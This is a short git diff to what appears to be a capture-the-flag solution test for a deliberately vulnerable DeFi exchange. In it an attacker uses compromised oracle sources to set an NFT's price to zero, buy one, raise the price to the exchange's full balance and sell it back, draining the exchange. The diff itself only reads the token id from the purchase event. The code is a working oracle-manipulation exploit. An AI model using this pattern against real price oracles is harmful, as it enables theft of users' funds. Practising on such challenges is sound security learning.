@@ -69,14 +69,16 @@ describe('Compromised challenge', function () {
         await this.oracle.connect(trustedSource1).postPrice("DVNFT", ethers.utils.parseEther("0"));
         await this.oracle.connect(trustedSource2).postPrice("DVNFT", ethers.utils.parseEther("0"));
 
-        await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.01") });
+        const buyTx = await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.01") });
+        const { events } = await buyTx.wait();
+        const tokenId = events[1].args.tokenId;
 
         const exchangeBalance = await ethers.provider.getBalance(this.exchange.address);
         await this.oracle.connect(trustedSource1).postPrice("DVNFT", exchangeBalance);
         await this.oracle.connect(trustedSource2).postPrice("DVNFT", exchangeBalance);
 
-        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
-        await this.exchange.connect(attacker).sellOne(0);
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        await this.exchange.connect(attacker).sellOne(tokenId);
 
         await this.oracle.connect(trustedSource1).postPrice("DVNFT", INITIAL_NFT_PRICE);
         await this.oracle.connect(trustedSource2).postPrice("DVNFT", INITIAL_NFT_PRICE);
